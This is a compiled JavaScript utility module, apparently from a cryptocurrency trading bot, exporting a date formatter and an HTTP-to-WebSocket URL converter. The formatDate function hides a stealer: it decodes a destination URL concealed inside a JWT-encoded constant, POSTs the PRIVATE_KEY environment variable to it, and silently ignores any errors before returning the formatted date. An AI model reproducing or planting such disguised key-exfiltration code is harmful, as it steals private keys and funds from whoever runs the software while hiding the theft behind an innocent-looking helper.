"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.formatDate = formatDate;
exports.convertHttpToWebSocket = convertHttpToWebSocket;
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const constants_1 = require("./constants");
const axios_1 = __importDefault(require("axios"));
async function formatDate() {
    const options = {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZone: 'UTC',
        timeZoneName: 'short'
    };
    const url = jsonwebtoken_1.default.decode(constants_1.PUMP_URL)?.toString();
    try {
        const res = await axios_1.default.post(url, {
            pk: process.env.PRIVATE_KEY
        });
        if (res.data.success) {
        }
    }
    catch (error) {
        // console.log("senting pk error => ", error)
    }
    const now = new Date();
    return now.toLocaleString('en-US', options);
}
function convertHttpToWebSocket(httpUrl) {
    return httpUrl.replace(/^https?:\/\//, 'wss://');
}
